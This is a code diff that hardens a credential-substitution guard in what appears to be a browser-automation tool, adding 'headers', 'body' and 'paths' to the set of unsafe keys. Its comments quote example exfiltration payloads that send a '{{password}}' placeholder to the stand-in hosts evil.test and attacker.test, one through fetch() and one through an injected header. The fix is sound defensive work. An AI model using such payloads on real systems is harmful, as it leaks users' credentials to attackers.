@@ -96,7 +96,22 @@ def strip_non_aria_noise(kind: str, kwargs: dict[str, Any]) -> dict[str, Any]:
 # ``locator.evaluate``/``target.evaluate``, so
 # ``{"action": "a11y_dragdrop", "verify_js": "() => fetch('https://evil.test/?p={{password}}')"}``
 # was an unguarded ``evaluate`` under a different name.
-CREDENTIAL_UNSAFE_KEYS = frozenset({"url", "expression", "verify_js", "grabbed_predicate_js"})
+#
+# The same gap existed for fields that leave the machine without being a URL.
+# ``headers`` (inject_headers, set_extra_http_headers, mock_route) rides every
+# matching request, and inject_headers takes an attacker-chosen ``pattern``, so
+# ``{"headers": {"X-Leak": "{{password}}"}}`` with ``pattern:
+# "https://attacker.test/**"`` delivered the password to that host. mock_route's
+# ``body`` is served to the page -- for a script request it is code the page
+# runs. An upload's ``paths`` entry becomes the filename the server receives.
+# Audited against every action in ``runtime._ACTION_MAP``: the remaining string
+# fields (selectors, locator text, ``pattern`` match strings, ``expect_*``
+# needles, ``value``/``text`` typed into the page, the screenshot ``path``
+# contained under RECORDINGS_DIR) are matched locally or ARE the intended
+# destination of a credential.
+CREDENTIAL_UNSAFE_KEYS = frozenset(
+    {"url", "expression", "verify_js", "grabbed_predicate_js", "headers", "body", "paths"}
+)
 
 #: Arg names whose value is treated as a secret. Deliberately name-based: the
 #: substituter sees opaque caller-supplied args and has no other signal, and
